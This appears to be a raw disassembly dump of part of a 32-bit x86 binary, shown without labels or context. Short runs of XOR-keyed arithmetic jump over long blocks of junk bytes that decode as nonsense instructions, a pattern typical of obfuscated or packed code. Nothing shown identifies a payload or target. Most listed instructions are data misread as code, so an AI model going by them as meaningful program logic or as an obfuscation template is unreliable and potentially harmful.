  40eb38:	mov    DWORD PTR ds:0x42e1a8,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x77
  40eb8d:	cmp    dl,BYTE PTR [esi+0x70aff7e2]
  40eb93:	jo     0x40eb58
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40eb9a
  40eb99:	scas   eax,DWORD PTR es:[edi]
  40eb9a:	or     eax,0x4d35559b
  40eb9f:	(bad)  
  40eba0:	shrd   DWORD PTR [ecx+0x6ca87b02],esi,0xbe
  40eba8:	sub    al,BYTE PTR [edi]
  40ebaa:	imul   edi,DWORD PTR [edi],0xffffffb6
  40ebad:	rol    BYTE PTR [edi],cl
  40ebaf:	cmp    BYTE PTR [eax],ah
  40ebb1:	std    
  40ebb2:	idiv   BYTE PTR [ebx+esi*2-0x684786f9]
  40ebb9:	pop    ebx
  40ebba:	loopne 0x40ec0c
  40ebbc:	out    0x7d,eax
  40ebbe:	add    al,BYTE PTR [ecx+edx*8]
  40ebc1:	sbb    BYTE PTR [eax+0x6cfd5f2],ah
  40ebc7:	jge    0x40eb59
  40ebc9:	pop    ss
  40ebca:	lahf   
  40ebcb:	lods   al,BYTE PTR ds:[esi]
  40ebcc:	and    BYTE PTR [ebp+0x59],bh
  40ebcf:	ins    DWORD PTR es:[edi],dx
  40ebd0:	call   0x89b0e256
  40ebd5:	stc    
  40ebd6:	scas   al,BYTE PTR es:[edi]
  40ebd7:	hlt    
  40ebd8:	mov    cl,BYTE PTR [ebx]
  40ebda:	or     al,0xa9
  40ebdc:	mov    edx,0x19f7dc8
  40ebe1:	jge    0x40ec53
  40ebe3:	aas    
  40ebe4:	ins    BYTE PTR es:[edi],dx
  40ebe5:	in     eax,dx
  40ebe6:	sbb    BYTE PTR [ecx+ecx*8+0x22c33abb],bh
  40ebed:	(bad)
  40ebf1:	mov    esi,0x83640c07
  40ebf6:	add    eax,0x25ccfb8e
  40ebfb:	aad    0xc1
  40ebfd:	in     al,0x24
  40ebff:	out    0xd4,al
  40ec01:	fwait
  40ec02:	push   ecx
  40ec03:	nop
  40ec04:	popf   
  40ec05:	into   
  40ec06:	cli    
  40ec07:	dec    ebx
  40ec08:	mov    ebp,0x439610d5
  40ec0d:	push   es
  40ec0e:	mov    WORD PTR [eax+0x5b138163],ss
  40ec14:	ss sub al,0xff
  40ec17:	pop    ecx
  40ec18:	data16 js 0x40ec07
  40ec1b:	or     al,0xbb
  40ec1d:	inc    eax
  40ec1e:	int3   
  40ec1f:	retf   0x7efc
  40ec22:	inc    ebp
  40ec23:	pop    esi
  40ec24:	sub    DWORD PTR [eax-0x1b],0x49c09727
  40ec2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec2c:	inc    esi
  40ec2d:	imul   eax,edi,0xffffffa4
  40ec30:	aam    0xdb
  40ec32:	push   esi
  40ec33:	cmp    eax,0xa11db623
  40ec38:	repz or ah,bl
  40ec3b:	fiadd  DWORD PTR [ebx+0x3d22169b]
  40ec41:	fst    DWORD PTR [ebx]
  40ec43:	fild   DWORD PTR [ebx-0x35a5aa55]
  40ec49:	fisubr DWORD PTR [eax+0x43]
  40ec4c:	xchg   BYTE PTR [edi-0x7e],ch
  40ec4f:	daa    
  40ec50:	mov    al,0x83
  40ec52:	loopne 0x40ecc4
  40ec54:	mov    cl,0x6b
  40ec56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec57:	cmp    al,BYTE PTR [eax]
  40ec59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec5a:	mov    ah,al
  40ec5c:	xchg   esp,eax
  40ec5d:	enter  0x8c40,0x27
  40ec61:	sub    al,0xc5
  40ec63:	xor    cl,BYTE PTR [edi+ecx*1-0x16]
  40ec67:	loop   0x40ec59
  40ec69:	ja     0x40ec8d
  40ec6b:	inc    ecx
  40ec6c:	cld    
  40ec6d:	mov    dl,0x8b
  40ec6f:	lods   eax,DWORD PTR ds:[esi]
  40ec70:	mov    WORD PTR [edx-0x1c2aa9f9],gs
  40ec76:	dec    edi
  40ec77:	jo     0x40ec53
  40ec79:	jge    0x40ec88
  40ec7b:	push   esi
  40ec7c:	inc    ebp
  40ec7d:	ja     0x40ec42
  40ec7f:	arpl   WORD PTR [ebx-0x24],cx
  40ec82:	sti    
  40ec83:	mov    eax,DWORD PTR [ebx+0x27]
  40ec86:	push   0x70fbea83
  40ec8b:	push   edx
  40ec8c:	adc    edx,esi
  40ec8e:	popf   
  40ec8f:	adc    ebx,DWORD PTR [esi-0x1c]
  40ec92:	out    0xa7,eax
  40ec94:	inc    edi
  40ec95:	mov    ds:0xd60c7a6b,eax
  40ec9a:	adc    eax,0xae7e4173
  40ec9f:	xchg   esi,eax
  40eca0:	cmp    al,0x28
  40eca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eca3:	fld    DWORD PTR [edx]
  40eca5:	xchg   ebp,eax
  40eca6:	jnp    0x40ecc1
  40eca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eca9:	or     al,BYTE PTR [ebp+0x27]
  40ecac:	stos   BYTE PTR es:[edi],al
  40ecad:	popf   
  40ecae:	fild   QWORD PTR [esi]
  40ecb0:	mov    WORD PTR [eax],?
  40ecb2:	xchg   ebx,eax
  40ecb3:	xchg   edi,eax
  40ecb4:	xor    al,0x46
  40ecb6:	xchg   BYTE PTR ds:0x3340f353,al
  40ecbc:	jmp    0xbd9d:0xd8424d0a
  40ecc3:	cmc    
  40ecc4:	jge    0x40ec79
  40ecc6:	sbb    cl,ah
  40ecc8:	jle    0x40ecd1
  40ecca:	retf   0xf133
  40eccd:	aas    
  40ecce:	jmp    0x40ec54
  40ecd0:	jle    0x40ecd9
  40ecd2:	cmp    BYTE PTR [edx],ch
  40ecd4:	mov    esp,0x43f6e9d7
  40ecd9:	call   0xc8e3:0x8f3c02f5
  40ece0:	inc    edx
  40ece1:	jbe    0x40ed15
  40ece3:	(bad)  
  40ece4:	in     al,0x3b
  40ece6:	ror    DWORD PTR [ebx-0x48f013bb],0x4d
  40eced:	cld    
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ec98
  40ed00:	or     DWORD PTR [edi*1+0x7070aeba],ecx
  40ed07:	ret    
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed5d
  40ed0c:	pop    DWORD PTR [edx-0x31ebbe43]
  40ed12:	jne    0x40ecf8
  40ed14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed15:	lods   eax,DWORD PTR ds:[esi]
  40ed16:	ror    BYTE PTR ds:0xb3ff2623,0x7f
  40ed1d:	xlat   BYTE PTR ds:[ebx]
  40ed1e:	xchg   BYTE PTR [ebx+eiz*4],al
  40ed21:	pusha  
  40ed22:	loope  0x40ecc4
  40ed24:	fsub   st(3),st
  40ed26:	fwait
  40ed27:	loop   0x40ecdb
  40ed29:	pop    esi
  40ed2a:	loopne 0x40ed80
  40ed2c:	mov    edi,0xb6801c0e
  40ed31:	push   0xffffffdb
  40ed33:	xor    DWORD PTR [ebp+0x5cfb0d0a],ebx
  40ed39:	push   edx
  40ed3a:	nop
  40ed3b:	or     eax,0xe48241b5
  40ed40:	jo     0x40ed28
  40ed42:	sbb    al,bh
  40ed44:	jp     0x40ed5e
  40ed46:	jl     0x40ece4
  40ed48:	mov    DWORD PTR [edx],ecx
  40ed4a:	out    dx,eax
  40ed4b:	sbb    eax,0xa72a7ce2
  40ed50:	loopne 0x40ed84
  40ed52:	jge    0x40ed8d
  40ed54:	sbb    DWORD PTR [ebp+0x1e],edi
  40ed57:	inc    ecx
  40ed58:	in     al,dx
  40ed59:	retf   
  40ed5a:	clc    
  40ed5b:	nop
  40ed5c:	shl    DWORD PTR [ebx],0x47
  40ed5f:	pop    ebp
  40ed60:	pop    esi
  40ed61:	aad    0xb
  40ed63:	clc    
  40ed64:	add    edi,DWORD PTR [ecx]
  40ed66:	std    
  40ed67:	cmp    edi,DWORD PTR [ebx-0x74]
  40ed6a:	add    edi,DWORD PTR ds:0x5dec935d
  40ed70:	add    BYTE PTR ds:0xb9904548,al
  40ed76:	bound  eax,QWORD PTR [eax-0x27]
  40ed79:	stos   DWORD PTR es:[edi],eax
  40ed7a:	mov    ss:0xcb067b9,al
  40ed80:	pop    esp
  40ed81:	xor    al,0x4f
  40ed83:	and    BYTE PTR [edi+eiz*1-0x66],ah
  40ed87:	inc    ebp
  40ed88:	jmp    0xb1446450
  40ed8d:	jbe    0x40ed54
  40ed8f:	retf   
  40ed90:	push   ss
  40ed91:	jle    0x40ed34
  40ed93:	or     eax,0x3e41e18b
  40ed98:	xchg   ebx,eax
  40ed99:	inc    edi
  40ed9a:	jg     0x40edae
  40ed9c:	rcl    bh,0xae
  40ed9f:	or     BYTE PTR [ebx+0x15dc5210],dh
  40eda5:	sub    al,0x25
  40eda7:	add    al,0x7f
  40eda9:	sbb    al,0xf4
  40edab:	popa   
  40edac:	mov    WORD PTR [edi],es
  40edae:	ins    BYTE PTR es:[edi],dx
  40edaf:	cmp    DWORD PTR [ebp+0x6],0xb7e7abda
  40edb6:	push   ecx
  40edb7:	or     BYTE PTR [esi],dh
  40edb9:	pop    ss
  40edba:	stos   DWORD PTR es:[edi],eax
  40edbb:	mov    esi,DWORD PTR [ecx-0x57]
  40edbe:	clc    
  40edbf:	stc    
  40edc0:	es inc edx
  40edc2:	aam    0x34
  40edc4:	stc    
  40edc5:	aaa    
  40edc6:	push   0xab4f695b
  40edcb:	push   eax
  40edcc:	fidivr DWORD PTR [ecx+edx*1]
  40edcf:	shr    BYTE PTR [ebx+0x48fd1f14],cl
  40edd5:	inc    ebp
  40edd6:	mov    BYTE PTR ds:0xba57fc70,dl
  40eddc:	push   ebp
  40eddd:	test   BYTE PTR [ebx-0x171bdede],cl
  40ede3:	mov    ebp,0x5b6d7f8f
  40ede8:	or     dl,BYTE PTR [edi+0x1a]
  40edeb:	(bad)  
  40edec:	jmp    0xe2a15e25
  40edf1:	out    0xf1,al
  40edf3:	dec    edx
  40edf4:	push   ecx
  40edf5:	rol    BYTE PTR [ecx+ecx*1-0x4ba729a9],0xbe
  40edfd:	gs and eax,0x3d44ce86
  40ee03:	push   0x111288c4
  40ee08:	cmp    eax,0xfaaae264
  40ee0d:	out    0xb,al
  40ee0f:	xor    edx,DWORD PTR [eax-0x1c]
  40ee12:	xlat   BYTE PTR ds:[ebx]
  40ee13:	lods   al,BYTE PTR ds:[esi]
  40ee14:	and    dh,BYTE PTR [edi-0x76e445d3]
  40ee1a:	pop    edx
  40ee1b:	mov    BYTE PTR [ebp+esi*8+0x426aa1e0],0x5e
  40ee23:	(bad)  
  40ee25:	mov    DWORD PTR [edi+0x7d],ebx
  40ee28:	mov    al,0x19
  40ee2a:	sbb    al,0xef
  40ee2c:	mov    eax,DWORD PTR [ebp-0x29379586]
  40ee32:	fs pop edi
  40ee34:	sbb    esi,ecx
  40ee36:	repnz das 
  40ee38:	int3   
  40ee39:	(bad)  
  40ee3a:	out    dx,al
  40ee3b:	aas    
  40ee3c:	push   esi
  40ee3d:	cmp    eax,0xf6a504ca
  40ee42:	push   edx
  40ee43:	mov    bh,0x4d
  40ee45:	push   0x5b
  40ee47:	xchg   edi,eax
  40ee48:	data16 out 0x59,al
  40ee4b:	sub    al,0xaf
  40ee4d:	mov    bl,0xf7
  40ee4f:	sbb    dl,BYTE PTR [edx]
  40ee51:	mov    eax,0x290635a8
  40ee56:	jbe    0x40edfa
  40ee58:	jg     0x40efd7
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x73
  40ee7f:	adc    eax,0xac0d6621
  40ee84:	jo     0x40eef6
  40ee86:	ret    
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40eed7
  40ee8b:	mov    eax,0xa4ce762e
  40ee90:	scas   al,BYTE PTR es:[edi]
  40ee91:	push   eax
  40ee92:	xchg   edi,eax
  40ee93:	and    ebx,DWORD PTR [ebx+0x54]
  40ee96:	jo     0x40ef16
  40ee98:	xlat   BYTE PTR ds:[ebx]
  40ee99:	jp     0x40eeb9
  40ee9b:	dec    ecx
  40ee9c:	cmp    eax,0x6120202a
  40eea1:	call   0xe75a:0x48042139
  40eea8:	arpl   di,cx
  40eeaa:	icebp  
  40eeab:	add    dl,BYTE PTR [ebp-0x12e0937a]
  40eeb1:	stos   DWORD PTR es:[edi],eax
  40eeb2:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40eeb4:	test   BYTE PTR [edx-0x72935133],bl
  40eeba:	mov    eax,0x28d07cca
  40eebf:	mul    BYTE PTR [esi+0x9b2b07]
  40eec5:	leave  
  40eec6:	lods   eax,DWORD PTR ds:[esi]
  40eec7:	cdq    
  40eec8:	in     eax,dx
  40eec9:	push   esp
  40eeca:	mov    fs,WORD PTR [eax+edx*4-0x1a]
  40eece:	sar    ecx,cl
  40eed0:	jecxz  0x40ee61
  40eed2:	loop   0x40eec9
  40eed4:	mov    al,0xb6
  40eed6:	cld    
  40eed7:	or     eax,0xd5d0d610
  40eedc:	xor    ebp,esp
  40eede:	inc    esp
  40eedf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eee0:	call   0x4992a6d6
  40eee5:	loopne 0x40ef5d
  40eee7:	inc    eax
  40eee8:	cld    
  40eee9:	retf   
  40eeea:	jnp    0x40eef9
  40eeec:	push   esp
  40eeed:	jno    0x40eecf
  40eeef:	ss sahf 
  40eef1:	mov    ds:0xd6bab9fa,eax
  40eef6:	adc    ch,BYTE PTR [edx-0xf]
  40eef9:	add    BYTE PTR [eax-0x3590443],dl
  40eeff:	imul   ebx,DWORD PTR [edi+0x62],0x3c
  40ef03:	mov    esp,0x137bd026
  40ef08:	and    ch,BYTE PTR [ecx]
  40ef0a:	daa    
  40ef0b:	sub    al,BYTE PTR [esi-0x397a77c]
  40ef11:	sub    edx,0x31f01113
  40ef17:	shl    DWORD PTR [edx-0x4],1
  40ef1a:	sahf   
  40ef1b:	adc    al,0x83
  40ef1d:	ja     0x40ef47
  40ef1f:	out    dx,al
  40ef20:	cmp    ebx,DWORD PTR [eax-0x2e]
  40ef23:	retf   0x76c5
  40ef26:	mov    edx,0x8d981fe2
  40ef2b:	jge    0x40ef4c
  40ef2d:	jmp    0xc97e4c7f
  40ef32:	pusha  
  40ef33:	dec    ebx
  40ef34:	out    dx,al
  40ef35:	pop    esp
  40ef36:	cs das 
  40ef38:	sahf   
  40ef39:	xor    al,0xc6
  40ef3b:	mov    eax,0xc087de5f
  40ef40:	int3   
  40ef41:	je     0x40ef13
  40ef43:	gs sbb al,0x9f
  40ef46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef47:	mov    dl,0xc0
  40ef49:	adc    BYTE PTR [ebx+0x34],bl
  40ef4c:	sbb    esp,DWORD PTR [edi-0x206426d0]
  40ef52:	iret   
  40ef53:	pop    eax
  40ef54:	dec    esi
  40ef55:	cmp    eax,0x9e0543eb
  40ef5a:	das    
  40ef5b:	pop    eax
  40ef5c:	ins    BYTE PTR es:[edi],dx
  40ef5d:	call   0xd105bd70
  40ef62:	xchg   esi,eax
  40ef63:	stos   DWORD PTR es:[edi],eax
  40ef64:	mov    edi,0x379bffb0
  40ef69:	add    edi,ecx
  40ef6b:	addr16 jbe 0x40ef39
  40ef6e:	mov    ebp,0x76a98d83
  40ef73:	xor    al,0xdd
  40ef75:	push   ebp
  40ef76:	cmp    BYTE PTR ds:0xbc3e7e76,0x49
  40ef7d:	cdq    
  40ef7e:	aad    0x7f
  40ef80:	dec    esp
  40ef81:	mov    cs,WORD PTR [ebx+ebp*2]
  40ef84:	sbb    edi,DWORD PTR [ebx+0x58df2e3e]
  40ef8a:	xor    BYTE PTR [eax-0x4c197ca2],cl
  40ef90:	mov    ch,0x85
  40ef92:	rol    esp,cl
  40ef94:	imul   ecx,esp,0x11
  40ef97:	ins    DWORD PTR es:[edi],dx
  40ef98:	in     eax,dx
  40ef99:	and    al,0x8c
  40ef9b:	push   esi
  40ef9c:	sahf   
  40ef9d:	add    al,0xa2
  40ef9f:	std    
  40efa0:	cli    
  40efa1:	dec    ecx
  40efa2:	in     al,0x39
  40efa4:	outs   dx,DWORD PTR ds:[esi]
  40efa5:	inc    esp
  40efa6:	jl     0x40efa4
  40efa8:	int3   
  40efa9:	test   BYTE PTR [ebp+0x1f],0xa9
  40efad:	(bad)  [esi+0x64d636d9]
  40efb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efb4:	scas   eax,DWORD PTR es:[edi]
  40efb5:	push   ebp
  40efb6:	mov    al,0x3b
  40efb8:	mov    eax,ds:0x2e2d2a85
  40efbd:	mov    ?,WORD PTR [ebp+0x68ae5f18]
  40efc3:	add    eax,0x8e2b9497
  40efc8:	inc    edi
  40efc9:	jmp    0xe2b8:0x2218be05
  40efd0:	dec    edx
  40efd1:	std    
  40efd2:	jmp    0x933b7cc6
  40efd7:	xor    eax,esi
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	lds    ebx,FWORD PTR [edx-0x542f476e]
  40f000:	jo     0x40f072
  40f002:	ret    
  40f003:	jg     0x40f075
  40f005:	jo     0x40f07d
  40f007:	mov    dl,0xa6
  40f009:	iret   
  40f00a:	test   DWORD PTR [ebp+edi*2+0x7db3e9d8],edi
  40f011:	or     edi,DWORD PTR [esi+0xdba4725]
  40f017:	fcom   DWORD PTR [edi+0x7d]
  40f01a:	ficom  WORD PTR [ecx-0x7f0f18bf]
  40f020:	into   
  40f021:	push   0xe8467d47
  40f026:	icebp  
  40f027:	inc    eax
  40f028:	dec    esi
  40f029:	xchg   BYTE PTR ds:0xf146bede,dh
  40f02f:	lds    ebx,FWORD PTR [eax-0x11]
  40f032:	push   esi
  40f033:	pop    esi
  40f034:	xchg   DWORD PTR [edx],ebp
  40f036:	adc    al,0xcb
  40f038:	mov    ebx,0x4dd12e84
  40f03d:	mov    esp,DWORD PTR [esi]
  40f03f:	jmp    0x81440ebc
  40f044:	pop    edi
  40f045:	std    
  40f046:	and    eax,0x93c5b2b4
  40f04b:	mov    ebx,?
  40f04d:	jge    0x40efd9
  40f04f:	in     eax,0xba
  40f051:	mov    al,0xd0
  40f053:	cli    
  40f054:	fwait
  40f055:	mov    ds:0x7fe4b189,al
  40f05a:	lgdtd  [ebx+0x71e5bf8b]
  40f061:	pop    ds
  40f062:	push   0xc7af623b
  40f067:	sbb    al,0x8
  40f069:	push   edi
  40f06a:	lods   eax,DWORD PTR ds:[esi]
  40f06b:	hlt    
  40f06c:	bound  eax,QWORD PTR [edi-0x3c]
  40f06f:	inc    eax
  40f070:	xor    bh,BYTE PTR [ebp+0x535fa671]
  40f076:	push   cs
  40f077:	push   eax
  40f078:	mov    al,ds:0xa10f5c9b
  40f07d:	sub    dh,bh
  40f07f:	imul   eax,DWORD PTR [edx-0x53d3c4d4],0x2d
  40f086:	pop    ebp
  40f087:	push   eax
  40f088:	test   al,0x22
  40f08a:	adc    al,0xec
  40f08c:	sbb    DWORD PTR [ebp+0x43149ab5],0xd3a5497d
  40f096:	cld    
  40f097:	ss jg  0x40f087
  40f09a:	arpl   WORD PTR [edx+0x6ffbbaab],ax
  40f0a0:	add    esp,esi
  40f0a2:	xchg   esp,eax
  40f0a3:	xchg   ecx,eax
  40f0a4:	mov    edi,DWORD PTR [ebx+0x6d]
  40f0a7:	inc    eax
  40f0a8:	rcl    esp,cl
  40f0aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0ab:	push   ebp
  40f0ac:	out    dx,eax
  40f0ad:	imul   ecx,DWORD PTR [ecx+0x73],0xf1eb2464
  40f0b4:	out    0x51,al
  40f0b6:	xor    al,0xb1
  40f0b8:	fcomp  st(3)
  40f0ba:	jl     0x40f05b
  40f0bc:	mov    ebx,0x420a75d4
  40f0c1:	add    ebp,edi
  40f0c3:	mov    eax,ds:0xcf5a4fe9
  40f0c8:	jbe    0x40f146
  40f0ca:	jmp    0x40f0a4
  40f0cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0cd:	leave  
  40f0ce:	loop   0x40f065
  40f0d0:	adc    eax,0x86339cfa
  40f0d5:	aaa    
  40f0d6:	std    
  40f0d7:	mov    ebp,0x9d8887fc
  40f0dc:	loop   0x40f129
  40f0de:	inc    ecx
  40f0df:	xchg   edx,eax
  40f0e0:	mov    ecx,0x140e9299
  40f0e5:	jge    0x40f071
  40f0e7:	and    ah,0x4e
  40f0ea:	sti    
  40f0eb:	std    
  40f0ec:	dec    edx
  40f0ed:	pop    esp
  40f0ee:	mov    ebx,0xd4f5ed97
  40f0f3:	out    dx,eax
  40f0f4:	call   0x837ddcc4
  40f0f9:	cmp    eax,0x72b01aa4
  40f0fe:	jo     0x40f177
  40f100:	mov    ch,0x8d
  40f102:	and    DWORD PTR [esi-0x64],ebp
  40f105:	aad    0x93
  40f107:	nop
  40f108:	cmp    edi,DWORD PTR [ecx+0x50]
  40f10b:	scas   al,BYTE PTR es:[edi]
  40f10c:	adc    esi,DWORD PTR ds:0xf8ac24ab
  40f112:	shr    DWORD PTR [edi-0x50],1
  40f115:	cdq    
  40f116:	jnp    0x40f117
  40f118:	cmp    BYTE PTR [eax+0x47],dl
  40f11b:	jae    0x40f0f8
  40f11d:	mov    ecx,0xb9be6b6b
  40f122:	aaa    
  40f123:	jl     0x40f15d
  40f125:	outs   dx,BYTE PTR gs:[esi]
  40f127:	jp     0x40f168
  40f129:	div    ch
  40f12b:	mov    DWORD PTR [ebx+0x14],ecx
  40f12e:	arpl   WORD PTR [ebp+0x18b27eae],si
  40f134:	das    
  40f135:	and    ah,ch
  40f137:	hlt    
  40f138:	in     eax,0xe3
  40f13a:	jmp    0xfce9:0xc85125b2
  40f141:	sub    DWORD PTR [ebp-0x24],0xf57499cd
  40f148:	inc    ebp
  40f149:	xor    edx,esi
  40f14b:	pop    es
  40f14c:	mov    esi,0xa462ba1a
  40f151:	sub    BYTE PTR [eax],ah
  40f153:	je     0x40f2d1
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [esi],ebx
  40f16e:	jge    0x40f1db
  40f170:	cmc    
  40f171:	mov    ds:0xc37070aa,eax
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f101
  40f17a:	mov    eax,0xce2dda36
  40f17f:	retf   
  40f180:	or     eax,0x93a3c75d
  40f185:	and    cl,ah
  40f187:	rol    DWORD PTR [ebx+edi*8+0x7cf0aacd],cl
  40f18e:	imul   ecx,DWORD PTR [ebx-0x14b1d12c],0xfcbfba40
  40f198:	push   cs
  40f199:	mov    dh,0x3
  40f19b:	dec    edi
  40f19c:	mov    cl,0x44
  40f19e:	inc    ebp
  40f19f:	mov    ah,dh
  40f1a1:	imul   edi,DWORD PTR [esi-0x2b2e4eca],0x38
  40f1a8:	jb     0x40f1eb
  40f1aa:	inc    edx
  40f1ab:	push   ebx
  40f1ac:	int    0x50
  40f1ae:	and    dl,cl
  40f1b0:	add    BYTE PTR [esi+0x47],al
  40f1b3:	ror    BYTE PTR [ebx+edi*8+0x3a],cl
  40f1b7:	sub    esi,eax
  40f1b9:	mov    ah,0xcf
  40f1bb:	(bad)  
  40f1bd:	sti    
  40f1be:	xor    ah,ah
  40f1c0:	(bad)
  40f1c3:	scas   al,BYTE PTR es:[edi]
  40f1c4:	push   edx
  40f1c5:	add    DWORD PTR [edi+0x3f],0xffffffed
  40f1c9:	in     al,dx
  40f1ca:	lsl    ebp,sp
  40f1cd:	sub    cl,BYTE PTR [bp+di]
  40f1d0:	mov    edx,ecx
  40f1d2:	sbb    al,0xe9
  40f1d4:	call   0x3b13fbce
  40f1d9:	mov    bl,0x54
  40f1db:	inc    sp
  40f1dd:	test   eax,0x51b5504f
  40f1e2:	call   0x681ac47f
  40f1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1e8:	and    eax,0x6440327
  40f1ed:	xor    DWORD PTR [eax+eax*4+0x37948e46],ebp
  40f1f4:	cld    
  40f1f5:	ss pusha 
  40f1f7:	int    0xc3
  40f1f9:	shr    bl,1
  40f1fb:	or     DWORD PTR [ecx-0x4fadc089],0x56019a09
  40f205:	and    DWORD PTR [edi-0x50],ebp
  40f208:	or     al,0x44
  40f20a:	mov    bh,0x88
  40f20c:	mov    esi,DWORD PTR [eax-0x45adaeb8]
  40f212:	xchg   DWORD PTR [esi+0x2738beb3],eax
  40f218:	add    esi,DWORD PTR [ebx]
  40f21a:	loope  0x40f1ce
  40f21c:	sar    BYTE PTR [edi-0x10a58ff5],1
  40f222:	loop   0x40f1f7
  40f224:	xor    DWORD PTR [esi*4-0x50f9c4c],0x26
  40f22c:	imul   edi,eax,0x66
  40f22f:	pop    ss
  40f230:	sub    eax,0x967dc52a
  40f235:	adc    dh,BYTE PTR [ebx]
  40f237:	and    ebp,DWORD PTR [edx+0x44dc55ae]
  40f23d:	js     0x40f246
  40f23f:	sbb    al,0xa8
  40f241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f242:	loop   0x40f26b
  40f244:	push   edx
  40f245:	inc    esp
  40f246:	push   cs
  40f247:	loopne 0x40f2ae
  40f249:	cmp    DWORD PTR [edi],ebp
  40f24b:	cmp    eax,0x8810d341
  40f250:	push   ds
  40f251:	pusha  
  40f252:	xchg   esi,eax
  40f253:	adc    BYTE PTR [ebx-0x3a],0xea
  40f257:	(bad)  
  40f258:	mov    bl,0x7e
  40f25a:	jo     0x40f2b2
  40f25c:	cld    
  40f25d:	pop    ebp
  40f25e:	and    bh,cl
  40f260:	nop
  40f261:	das    
  40f262:	sub    al,0xd6
  40f264:	fstp   st(3)
  40f266:	mov    cl,0x95
  40f268:	or     eax,0xaaed7119
  40f26d:	rcl    DWORD PTR [esi-0x80],1
  40f270:	outs   dx,DWORD PTR ds:[esi]
  40f271:	jo     0x40f2e6
  40f273:	push   cs
  40f274:	popf   
  40f275:	les    esp,FWORD PTR [eax+0x19]
  40f278:	jle    0x40f264
  40f27a:	push   ebp
  40f27b:	and    bh,cl
  40f27d:	mov    al,0x67
  40f27f:	mov    edi,0x4a1f84d5
  40f284:	loop   0x40f2d5
  40f286:	(bad)  
  40f287:	out    0x56,eax
  40f289:	loop   0x40f290
  40f28b:	lods   eax,DWORD PTR ds:[esi]
  40f28c:	and    BYTE PTR ds:0xe0359026,bl
  40f292:	and    BYTE PTR [esi],dl
  40f294:	xlat   BYTE PTR ds:[ebx]
  40f295:	rcl    ebx,0xcc
  40f298:	sub    eax,0x927057f3
  40f29d:	adc    DWORD PTR [ebp-0x59],edx
  40f2a0:	cli    
  40f2a1:	dec    ecx
  40f2a2:	mov    al,ds:0x39972d0e
  40f2a7:	mov    ecx,0xf8e43582
  40f2ac:	adc    BYTE PTR [esi-0x29f68c13],bl
  40f2b2:	inc    eax
  40f2b3:	push   ss
  40f2b4:	pusha  
  40f2b5:	jno    0x40f2a6
  40f2b7:	mov    eax,ds:0x9d61e984
  40f2bc:	sti    
  40f2bd:	dec    eax
  40f2be:	push   es
  40f2bf:	jne    0x40f2e7
  40f2c1:	and    al,0x6a
  40f2c3:	mov    ch,0x75
  40f2c5:	xchg   edx,eax
  40f2c6:	mov    DWORD PTR [eax],0x60341e89
